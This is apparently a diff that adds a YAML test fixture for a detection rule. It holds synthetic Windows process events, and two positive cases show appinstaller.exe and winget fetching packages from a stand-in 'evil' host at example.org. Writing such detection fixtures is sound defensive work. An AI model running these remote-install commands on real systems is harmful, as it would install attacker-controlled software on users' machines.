@@ -1,0 +1,36 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: appinstaller.exe
+      executable: 'C:\Windows\System32\appinstaller.exe'
+      command_line: 'AppInstaller.exe ms-appinstaller:?source=https://example.org/evil.msix'
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: winget.exe
+      executable: 'C:\Windows\System32\winget.exe'
+      command_line: 'winget.exe install --manifest https://example.org/evil.yaml'
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: winget.exe
+      executable: 'C:\Windows\System32\winget.exe'
+      command_line: 'winget.exe install Microsoft.PowerToys'
